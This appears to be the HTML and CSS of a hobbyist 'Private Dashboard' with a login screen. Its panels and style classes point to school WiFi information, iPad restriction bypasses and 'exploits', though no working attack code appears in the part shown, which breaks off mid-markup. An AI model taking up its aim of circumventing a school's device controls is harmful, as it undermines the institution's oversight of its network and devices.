<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* CSS Variables for theming - NEW */
    :root {
      --dark-bg: #1a1a1a;
      --dark-text: #f9f2dc;
      --dark-box-bg: #2a2a2a;
      --dark-box-shadow: rgba(255, 145, 77, 0.3);
      --dark-header-bg: #ff914d;
      --dark-header-text: #000;
      --dark-primary-accent: #ff914d;
      --dark-secondary-accent: #ffb67a;
      --dark-button-text: #000;
      --dark-h2-color: #ffbf80;
      --dark-update-entry-bg: #40210f;
      --dark-update-entry-text: #ffccb3;
      --dark-calendar-bg: #333;
      --dark-motivation-box-bg: #333;
      --dark-motivation-box-text: #ffd966;
      --dark-panel-bg: #2a2a2a;
      --dark-panel-h2-color: #ff914d;
      --dark-wifi-entry-bg: #40210f;
      --dark-info-text-bg: #40210f;
      --dark-coming-soon-bg: #40210f;
      --dark-input-bg: #1c1c1c;
      --dark-input-text: white;
      --dark-button-bg: red;
      --dark-button-color: white;
    }

    .light-theme {
      --dark-bg: #f9f2dc;
      --dark-text: #1a1a1a;
      --dark-box-bg: #ffd966;
      --dark-box-shadow: rgba(255, 145, 77, 0.6);
      --dark-header-bg: #ff914d; /* Could change to a lighter yellow/orange if preferred */
      --dark-header-text: #000;
      --dark-primary-accent: #ff914d;
      --dark-secondary-accent: #ffb67a;
      --dark-button-text: #000;
      --dark-h2-color: #994d00;
      --dark-update-entry-bg: #ffd999;
      --dark-update-entry-text: #994d00;
      --dark-calendar-bg: #ffd966;
      --dark-motivation-box-bg: #fff3cc;
      --dark-motivation-box-text: #994d00;
      --dark-panel-bg: #ffd966;
      --dark-panel-h2-color: #994d00;
      --dark-wifi-entry-bg: #ffd999;
      --dark-info-text-bg: #ffd999;
      --dark-coming-soon-bg: #ffd999;
      --dark-input-bg: #e0e0e0; /* Lighter background for inputs */
      --dark-input-text: #333; /* Darker text for inputs */
      --dark-button-bg: #ff7f7f; /* Lighter red button */
      --dark-button-color: #000; /* Darker text on button */
    }

    /* Initial Loader Animation Styles - NEW */
    #initialLoader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #000; /* Deep black background */
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 2.5em;
      font-family: 'Courier New', monospace;
      z-index: 9999;
      transition: opacity 1s ease-out; /* Fade out effect */
      flex-direction: column; /* To stack messages and progress bar */
    }

    #loaderBox {
        border: 3px solid #ff914d;
        border-radius: 15px;
        padding: 40px 60px;
        box-shadow: 0 0 30px #ff914d;
        text-align: center;
        opacity: 0; /* Starts hidden, animates in */
        animation: fadeIn 1s ease-in-out forwards;
    }

    #loaderBox p {
        margin: 10px 0;
        overflow: hidden; /* For typing effect */
        white-space: nowrap; /* Keeps content on a single line */
        font-size: 0.9em; /* Slightly smaller text inside box */
    }

    /* Typing effect for messages - NEW */
    .typing {
        width: 0;
        animation: typing 2s steps(20, end) forwards, blink-caret .75s step-end infinite;
    }

    @keyframes typing {
        from { width: 0 }
        to { width: 100% }
    }

    /* Blinking caret for typing effect - NEW */
    @keyframes blink-caret {
        from, to { border-color: transparent }
        50% { border-color: white }
    }
    
    #initialLoader.hidden {
      opacity: 0;
      pointer-events: none;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* System Notification Styles - NEW */
    #systemNotifications {
        position: fixed;
        top: 20px; /* Adjust as preferred (bottom, top, left, right) */
        right: 20px;
        z-index: 10000; /* Above everything else */
        display: flex;
        flex-direction: column;
        gap: 10px;
        pointer-events: none; /* Allows clicks to pass through empty area */
    }

    .notification-item {
        background: var(--dark-box-bg);
        border-radius: 8px;
        padding: 12px 20px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
        color: var(--dark-text);
        max-width: 300px;
        min-width: 250px;
        opacity: 0;
        transform: translateX(100%);
        transition: all 0.5s ease-out;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 0.9em;
        pointer-events: all; /* Make specific notification clickable */
        border: 1px solid var(--dark-primary-accent);
    }
    
    .notification-item.show {
        opacity: 1;
        transform: translateX(0);
    }
    
    .notification-item .close-btn {
        background: none;
        border: none;
        color: var(--dark-primary-accent);
        font-weight: bold;
        cursor: pointer;
        font-size: 1.2em;
        margin-left: auto;
        padding: 0 5px;
    }

    /* General Styling */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Hide scrollbars during loader */
    }
    
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--dark-bg);
      color: var(--dark-text);
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; /* Retained zoom property */
      overflow-x: hidden; /* Prevent horizontal scroll due to panel transitions */
    }

    /* Apply theme variables */
    body.dashboard-body .dashboard-header {
      background: var(--dark-header-bg);
      color: var(--dark-header-text);
    }

    body.dashboard-body .version-box {
      background: var(--dark-secondary-accent);
      color: var(--dark-header-text);
    }

    .quick-bar button, .system-controls button {
      background-color: var(--dark-primary-accent);
      color: var(--dark-button-text);
      transition: background 0.2s, transform 0.1s ease-out; /* Add transform for animation */
      box-shadow: 0 4px 8px rgba(0,0,0,0.2); /* Button shadow */
    }

    .quick-bar button:hover, .system-controls button:hover {
      background-color: var(--dark-secondary-accent);
      transform: translateY(-2px); /* Lift effect on hover */
      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
    }

    .quick-bar button:active, .system-controls button:active {
        transform: translateY(1px); /* Push effect on click */
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }


    body.dashboard-body.light-theme .announcement-bar {
      background-color: var(--dark-secondary-accent); /* Adjusted for light theme */
      color: var(--dark-header-text);
    }

    .box, .info-panel {
      background-color: var(--dark-box-bg);
      box-shadow: 0 0 15px var(--dark-box-shadow);
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s; /* Panel transition */
    }
    .box h2, .info-panel h2 {
      color: var(--dark-h2-color);
      transition: color 0.3s;
    }

    .update-entry {
      background: var(--dark-update-entry-bg);
      color: var(--dark-update-entry-text);
      transition: background 0.3s, color 0.3s;
    }

    .calendar div {
      background: var(--dark-calendar-bg);
      transition: background 0.3s;
    }
    
    .today {
      background: var(--dark-primary-accent) !important;
      color: var(--dark-header-text) !important;
      animation: pulseToday 1.5s infinite alternate; /* New animation for today */
    }

    @keyframes pulseToday {
        from { box-shadow: 0 0 0 0 rgba(255, 145, 77, 0.4); }
        to { box-shadow: 0 0 0 8px rgba(255, 145, 77, 0); }
    }


    body.dashboard-body.light-theme .today {
      background: var(--dark-h2-color) !important;
      color: var(--dark-secondary-accent) !important;
    }

    .motivation-box {
      background-color: var(--dark-motivation-box-bg);
      color: var(--dark-motivation-box-text);
      box-shadow: 0 0 12px var(--dark-box-shadow);
    }

    .wifi-grid div, .wifi-entry div {
      background: var(--dark-wifi-entry-bg);
    }

    .handbook-buttons button, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: var(--dark-primary-accent);
      color: var(--dark-button-text);
      transition: background 0.2s, transform 0.1s ease-out;
    }

    .handbook-buttons button:hover, .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: var(--dark-secondary-accent);
      transform: translateY(-2px);
    }

    .coming-soon, .info-text, .school-info-item, .ipad-content, .bypass-content {
      background: var(--dark-coming-soon-bg);
      color: var(--dark-update-entry-text); /* Consistent with update entries for "info" boxes */
      transition: background 0.3s, color 0.3s;
    }

    .school-info-label {
      color: var(--dark-h2-color);
      transition: color 0.3s;
    }

    .ipad-options button {
      background-color: var(--dark-primary-accent);
      color: var(--dark-button-text);
      transition: background 0.2s, transform 0.1s ease-out;
    }
    .ipad-options button:hover {
      background-color: var(--dark-secondary-accent);
      transform: translateY(-2px);
    }

    /* Login specific styling */
    .login-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-out; /* Add transform for hover */
    }

    .login-box:hover {
        transform: scale(1.01);
        box-shadow: 0 0 20px white;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--dark-input-bg);
      border: 1px solid transparent; /* Subtle border for focus */
      color: var(--dark-input-text);
      border-radius: 8px;
      font-size: 1em;
      transition: background 0.3s, border-color 0.3s;
    }

    .login-box input:focus {
        border-color: var(--dark-primary-accent); /* Highlight on focus */
        outline: none;
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
    }
    
    #showPassword:checked + span {
      color: var(--dark-button-bg); /* Use theme variable */
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--dark-button-bg);
      color: var(--dark-button-color);
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s ease-out, box-shadow 0.2s; /* Added transform and shadow */
    }
    
    .login-box button:hover {
      background-color: #cc0000; /* Darker red on hover */
      transform: translateY(-1px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    .login-box button:active {
        transform: translateY(1px);
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Specific Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
    /* Import new fonts for settings panel - NEW */
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');


    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--dark-header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--dark-header-text);
      margin-bottom: 20px;
      transition: background 0.3s, color 0.3s;
    }

    .dashboard-header h1 {
      font-size: 24px;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: var(--dark-secondary-accent);
      padding: 8px 15px;
      border-radius: 8px;
      color: var(--dark-header-text);
      font-weight: bold;
      transition: background 0.3s, color 0.3s;
    }

    .quick-bar, .system-controls { /* Merged style for both sets of buttons */
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
    }

    .quick-bar button, .system-controls button {
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      min-width: 110px;
      white-space: nowrap;
      transition: all 0.2s ease-out; /* Smooth transitions */
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    /* New styling for system controls to distinguish slightly - NEW */
    .system-controls {
        margin-top: 25px; /* Separate from previous row of buttons */
        margin-bottom: 20px;
    }

    .system-controls button {
        background-color: #6a1b9a; /* Different color for system controls */
        color: white;
        border: 1px solid #9c27b0;
    }

    .system-controls button:hover {
        background-color: #7b1fa2;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        transform: translateY(-2px);
    }
    
    #panicBtn {
      background: var(--dark-button-bg) !important;
      color: var(--dark-button-color) !important;
    }

    #panicBtn:hover {
        background: #cc0000 !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--dark-primary-accent);
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      padding: 20px;
      border-radius: 12px;
      min-height: 120px;
      flex: 1 1 300px;
      opacity: 0; /* Hidden by default */
      transform: translateY(20px); /* Slightly below final position */
      animation: slideInBox 0.5s ease-out forwards; /* Animation to slide in */
    }

    /* Animation for dashboard boxes to slide in one by one - NEW */
    .box:nth-child(1) { animation-delay: 0.1s; }
    .box:nth-child(2) { animation-delay: 0.2s; }
    /* Add delays for updatesNotifications children too */
    #updatesNotifications > .box:nth-child(1) { animation-delay: 0.3s; }
    #updatesNotifications > .box:nth-child(2) { animation-delay: 0.4s; }


    @keyframes slideInBox {
        to { opacity: 1; transform: translateY(0); }
    }

    .box p, .box ul, .info-panel p, .info-panel ul, .info-panel li {
      font-size: 14px;
      line-height: 1.5; /* Improve readability */
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    /* New calendar specific day highlight for today - NEW */
    .calendar div.day-header {
      background: rgba(255, 145, 77, 0.5); /* Slightly different header color */
      font-weight: bold;
    }
    .calendar div {
      padding: 6px;
      border-radius: 4px;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      transition: all 0.5s ease-out; /* Canvas container transition */
      opacity: 0;
      transform: scale(0.95);
    }
    #canvasContainer.active {
      opacity: 1;
      transform: scale(1);
    }


    #notesCanvas {
      border: 2px solid var(--dark-primary-accent);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--dark-primary-accent);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s ease-out;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--dark-secondary-accent);
      transform: translateY(-2px);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      min-height: 150px;
      opacity: 0; /* For animated display */
      transform: translateX(-20px); /* Slide in from left */
      transition: all 0.4s ease-out;
    }

    .info-panel.active {
        display: block; /* Important for animation target */
        opacity: 1;
        transform: translateX(0);
    }


    /* Specific styles for new panels - NEW */
    /* Reminder Panel */
    #remindersPanel .reminder-entry {
        background-color: var(--dark-update-entry-bg);
        border-left: 5px solid var(--dark-primary-accent);
        padding: 10px 15px;
        margin-bottom: 10px;
        border-radius: 6px;
        display: flex;
        align-items: center;
        gap: 10px;
        transition: all 0.3s ease-in-out;
    }
    #remindersPanel .reminder-entry.completed {
        opacity: 0.6;
        text-decoration: line-through;
        border-left-color: green;
    }
    #remindersPanel .reminder-entry.overdue {
        border-left-color: red;
        animation: blinkRed 1s infinite alternate;
    }
    @keyframes blinkRed {
        from { background-color: var(--dark-update-entry-bg); }
        to { background-color: rgba(255, 0, 0, 0.2); }
    }
    #remindersPanel .reminder-text { flex-grow: 1; }
    #remindersPanel .reminder-time {
        font-size: 0.85em;
        color: var(--dark-h2-color);
        white-space: nowrap;
    }
    #remindersPanel .reminder-entry button {
        background: none;
        border: none;
        color: var(--dark-primary-accent);
        cursor: pointer;
        padding: 5px;
        font-size: 0.9em;
        transition: color 0.2s, transform 0.1s;
    }
    #remindersPanel .reminder-entry button:hover {
        color: var(--dark-secondary-accent);
        transform: scale(1.1);
    }
    #remindersPanel form { margin-top: 15px; }
    #remindersPanel form input[type="text"],
    #remindersPanel form input[type="datetime-local"] {
        width: calc(100% - 70px);
        margin-right: 10px;
        padding: 8px;
        border-radius: 4px;
        border: 1px solid var(--dark-primary-accent);
        background: var(--dark-input-bg);
        color: var(--dark-input-text);
        margin-bottom: 0;
    }
    #remindersPanel form button {
        width: 60px;
        padding: 8px;
        border-radius: 4px;
    }
    
    /* Settings Panel */
    #settingsPanel .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 15px;
        background: var(--dark-update-entry-bg);
        padding: 10px 15px;
        border-radius: 6px;
    }
    #settingsPanel label {
        flex-basis: 40%;
        color: var(--dark-update-entry-text);
    }
    #settingsPanel .setting-control {
        flex-basis: 55%;
        display: flex;
        gap: 10px;
    }
    #settingsPanel input[type="color"] {
        width: 50px;
        height: 30px;
        border: none;
        padding: 0;
        cursor: pointer;
        background: transparent;
    }
    #settingsPanel select, #settingsPanel input[type="range"] {
        flex-grow: 1;
        padding: 5px;
        border-radius: 4px;
        border: 1px solid var(--dark-primary-accent);
        background: var(--dark-input-bg);
        color: var(--dark-input-text);
    }
    #settingsPanel button.apply-settings {
        margin-top: 20px;
        width: 100%;
        padding: 10px;
    }

    /* Messaging Panel */
    #messagingPanel .chat-window {
        height: 300px;
        border: 1px solid var(--dark-primary-accent);
        border-radius: 8px;
        overflow-y: auto;
        padding: 15px;
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-bottom: 15px;
        background-color: var(--dark-input-bg);
        scroll-behavior: smooth; /* Smooth scrolling for new messages */
    }
    #messagingPanel .message {
        background-color: var(--dark-update-entry-bg);
        padding: 8px 12px;
        border-radius: 12px;
        max-width: 80%;
        align-self: flex-start;
        position: relative;
    }
    #messagingPanel .message.self {
        background-color: rgba(255, 145, 77, 0.4); /* Highlight own messages */
        align-self: flex-end;
    }
    #messagingPanel .message-author {
        font-size: 0.8em;
        font-weight: bold;
        color: var(--dark-h2-color);
        margin-bottom: 3px;
    }
    #messagingPanel .message-time {
        font-size: 0.7em;
        color: var(--dark-h2-color);
        text-align: right;
        margin-top: 5px;
    }
    #messagingPanel .message-input-area {
        display: flex;
        gap: 10px;
    }
    #messagingPanel .message-input-area input {
        flex-grow: 1;
        margin-bottom: 0;
    }
    
    /* File Manager Panel */
    #fileManagerPanel .file-structure {
        border: 1px solid var(--dark-primary-accent);
        border-radius: 8px;
        padding: 15px;
        background: var(--dark-input-bg);
        min-height: 200px;
    }
    #fileManagerPanel ul { list-style: none; padding: 0; margin: 0; }
    #fileManagerPanel li { padding: 5px 0; display: flex; align-items: center; cursor: pointer; }
    #fileManagerPanel li:hover { background-color: rgba(255, 145, 77, 0.1); }
    #fileManagerPanel .icon { margin-right: 8px; }
    #fileManagerPanel .folder-icon::before { content: '📁'; margin-right: 5px; }
    #fileManagerPanel .file-icon::before { content: '📄'; margin-right: 5px; }
    #fileManagerPanel .file-actions { margin-top: 15px; display: flex; gap: 10px;}

    /* Tasks Panel */
    #tasksPanel ul { list-style: none; padding: 0; margin: 15px 0; }
    #tasksPanel .task-item {
        background-color: var(--dark-update-entry-bg);
        padding: 10px 15px;
        margin-bottom: 8px;
        border-radius: 6px;
        display: flex;
        align-items: center;
        gap: 10px;
        border-left: 5px solid var(--dark-secondary-accent);
    }
    #tasksPanel .task-item.completed {
        opacity: 0.7;
        text-decoration: line-through;
        border-left-color: green;
    }
    #tasksPanel .task-item input[type="checkbox"] {
        cursor: pointer;
        transform: scale(1.3);
    }
    #tasksPanel .task-text { flex-grow: 1; }
    #tasksPanel .task-item button {
        background: none;
        border: none;
        color: red;
        cursor: pointer;
        padding: 5px;
    }
    #tasksPanel .task-filter button {
        background-color: rgba(255, 145, 77, 0.2);
        margin-right: 5px;
    }
    #tasksPanel .task-filter button.active {
        background-color: var(--dark-primary-accent);
        color: var(--dark-button-text);
    }

    /* Diagnostics Panel */
    #diagnosticsPanel .diag-output {
        border: 1px solid var(--dark-primary-accent);
        border-radius: 8px;
        background: var(--dark-input-bg);
        padding: 15px;
        min-height: 150px;
        font-family: 'Roboto Mono', monospace;
        color: limegreen; /* Console-like output */
        overflow-y: auto;
        margin-bottom: 15px;
    }
    #diagnosticsPanel .diag-output p {
        margin: 5px 0;
        font-size: 0.9em;
    }
    #diagnosticsPanel .progress-bar-container {
        width: 100%;
        background-color: var(--dark-calendar-bg);
        border-radius: 5px;
        margin-top: 10px;
    }
    #diagnosticsPanel .progress-bar {
        width: 0%;
        height: 20px;
        background-color: limegreen;
        border-radius: 5px;
        text-align: center;
        color: black;
        font-weight: bold;
        line-height: 20px;
        transition: width 0.5s ease-out;
    }

    /* Password Generator Panel */
    #passGenPanel .password-output {
        background: var(--dark-input-bg);
        border: 1px solid var(--dark-primary-accent);
        padding: 10px;
        border-radius: 8px;
        font-family: 'Roboto Mono', monospace;
        margin-bottom: 15px;
        text-align: center;
        font-size: 1.2em;
        word-break: break-all;
    }
    #passGenPanel .pass-controls label {
        display: block;
        margin-bottom: 8px;
        color: var(--dark-update-entry-text);
    }
    #passGenPanel .pass-controls input[type="range"] {
        width: 100%;
        margin-bottom: 10px;
    }
    #passGenPanel .pass-controls input[type="checkbox"] {
        margin-right: 5px;
        transform: scale(1.1);
        cursor: pointer;
    }

    /* Network Scanner Panel */
    #networkScannerPanel .scanner-display {
        border: 1px solid var(--dark-primary-accent);
        background: var(--dark-input-bg);
        padding: 15px;
        border-radius: 8px;
        min-height: 200px;
        overflow-y: auto;
        font-family: 'Roboto Mono', monospace;
        color: cyan;
    }
    #networkScannerPanel .scanner-display.scanning::before {
        content: 'Scanning... ';
        display: inline-block;
        animation: loadingDots 1s infinite step-end;
    }
    @keyframes loadingDots {
        0%, 20% { content: 'Scanning   '; }
        40% { content: 'Scanning.  '; }
        60% { content: 'Scanning.. '; }
        80%, 100% { content: 'Scanning...'; }
    }
    #networkScannerPanel table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 10px;
    }
    #networkScannerPanel th, #networkScannerPanel td {
        border: 1px solid var(--dark-calendar-bg);
        padding: 8px;
        text-align: left;
    }
    #networkScannerPanel th {
        background-color: var(--dark-update-entry-bg);
        color: var(--dark-primary-accent);
    }
    #networkScannerPanel tr:nth-child(even) { background-color: var(--dark-calendar-bg); }

    /* Encrypt/Decrypt Panel */
    #encryptDecryptPanel textarea {
        width: 100%;
        height: 120px;
        background: var(--dark-input-bg);
        color: var(--dark-input-text);
        border: 1px solid var(--dark-primary-accent);
        border-radius: 6px;
        padding: 10px;
        font-family: 'Roboto Mono', monospace;
        margin-bottom: 10px;
        resize: vertical;
    }
    #encryptDecryptPanel .cipher-key {
        display: flex;
        gap: 10px;
        align-items: center;
        margin-bottom: 15px;
    }
    #encryptDecryptPanel .cipher-key label { white-space: nowrap; }
    #encryptDecryptPanel .cipher-key input { flex-grow: 1; margin-bottom: 0; }
    #encryptDecryptPanel .cipher-actions { display: flex; gap: 10px; justify-content: flex-end;}
    
    /* Code Editor Panel */
    #codeEditorPanel .code-editor-wrapper {
        position: relative;
        background: #1e1e1e; /* Dark editor background */
        border: 1px solid var(--dark-primary-accent);
        border-radius: 8px;
        overflow: hidden;
    }
    #codeEditorPanel textarea.code-input {
        width: 100%;
        height: 300px;
        background: #1e1e1e;
        color: #d4d4d4; /* Light grey text */
        border: none;
        padding: 15px;
        font-family: 'Roboto Mono', monospace;
        font-size: 0.95em;
        line-height: 1.5;
        resize: vertical;
        outline: none;
        overflow-y: scroll;
        box-sizing: border-box; /* Include padding in width/height */
        -webkit-text-fill-color: #d4d4d4; /* For better text color control */
    }
    #codeEditorPanel .code-toolbar {
        display: flex;
        gap: 10px;
        justify-content: flex-start;
        padding: 10px 15px;
        background-color: #333;
        border-bottom: 1px solid var(--dark-primary-accent);
    }
    #codeEditorPanel .code-toolbar button {
        background-color: var(--dark-secondary-accent);
        color: black;
        padding: 5px 10px;
        border-radius: 4px;
        font-weight: normal;
        min-width: unset; /* Override quick-bar styling */
        white-space: nowrap;
    }
    #codeEditorPanel .code-toolbar button:hover {
        background-color: #ffd999;
    }
    #codeEditorPanel .file-list {
        background: var(--dark-input-bg);
        border: 1px solid var(--dark-primary-accent);
        border-radius: 8px;
        padding: 10px;
        margin-top: 15px;
        min-height: 80px;
        overflow-y: auto;
    }
    #codeEditorPanel .file-list span {
        display: block;
        padding: 5px;
        cursor: pointer;
        background-color: transparent;
        border-radius: 4px;
        transition: background-color 0.2s;
    }
    #codeEditorPanel .file-list span:hover {
        background-color: rgba(255, 145, 77, 0.1);
    }
    #codeEditorPanel .file-list span.active-file {
        background-color: var(--dark-primary-accent);
        color: var(--dark-button-text);
        font-weight: bold;
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Initial Loading Animation - NEW -->
  <div id="initialLoader">
    <div id="loaderBox">
        <p id="loaderMessage"></p>
    </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.7</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime" data-action="View Session Time">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock" data-action="View Real Time Clock">🕒 --:--:--</button>
      <button id="realDate" data-action="View Current Date">📅 --</button>
      <button id="notesBtn" data-action="Open Notes Canvas">📒 Notes</button>
      <button id="exportNotesBtn" data-action="Export Notes Canvas">💾 Export Notes</button>
      <button id="screenshotBtn" data-action="Take Screenshot">📸 Screenshot</button>
      <button id="toggleSectionsBtn" data-action="Toggle Main Sections">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn" data-action="Run System Diagnostics (Quick)">🛠️ Fix Issues</button>
      <button id="fullScreenBtn" data-action="Toggle Full Screen Mode">🖥️ Full Screen</button>
      <button id="zoomInBtn" data-action="Zoom In Dashboard">➕ Zoom In</button>
      <button id="zoomOutBtn" data-action="Zoom Out Dashboard">➖ Zoom Out</button>
      <button id="restartBtn" data-action="Restart Application">🔄 Restart</button>
      <button id="panicBtn" data-action="Activate Panic Button">🚨 Panic</button>
      <button id="themeToggle" data-action="Toggle Dark/Light Theme">🌙 Dark Mode</button>
      <button id="logoutBtn" data-action="Log Out of System">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! Version 1.5.7 includes new system applications, a powerful reminder system, enhanced animations, and full theming options! 🚨</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Added Reminder System.</div> <!-- NEW -->
        <div class="update-entry">Added Custom Settings Panel.</div> <!-- NEW -->
        <div class="update-entry">Implemented new system applications.</div> <!-- NEW -->
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
        <p>Your session started successfully!</p> <!-- NEW -->
        <p>Remember to check out the new Reminder System!</p> <!-- NEW -->
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')" data-action="Open School WiFi Information">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')" data-action="Open School iPad Restrictions Info">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')" data-action="Open Student Handbooks Info">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')" data-action="Open School Building Map Info">🏫 School Building Map Information</button>
